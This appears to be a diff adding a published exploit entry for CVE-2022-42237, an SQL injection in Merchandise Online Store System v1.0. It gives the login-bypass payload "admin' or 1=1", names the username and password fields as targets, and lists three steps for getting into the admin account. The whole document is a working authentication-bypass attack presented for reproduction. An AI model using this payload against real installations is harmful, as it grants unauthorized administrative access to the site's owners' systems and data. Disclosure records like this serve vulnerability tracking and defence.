@@ -1,0 +1,31 @@
+# Exploit Title: Merchandise Online Store System - SQL Injection
+# Exploit Author: Pratik Shetty
+# Vendor Name: oretnom23
+# Vendor Homepage: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html
+# Software Link: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html
+# Version: v1.0
+# Tested on: Parrot GNU/Linux 4.10, Apache
+# CVE: CVE-2022-42237
+
+
+Description:-
+An SQL injection issue in Merchandise Online Store System v.1.0 allows an attacker to logi in into admin account. 
+
+
+`
+Payload used:-
+admin' or 1=1 
+
+`
+Parameter:- 
+Username and Password
+
+
+`
+Steps to reproduce:-
+
+1. First go the admin login
+2. From there in username and password put the payload
+Payload: 
+admin' or 1=1 
+3. Now press enter and we get logged in into admin account
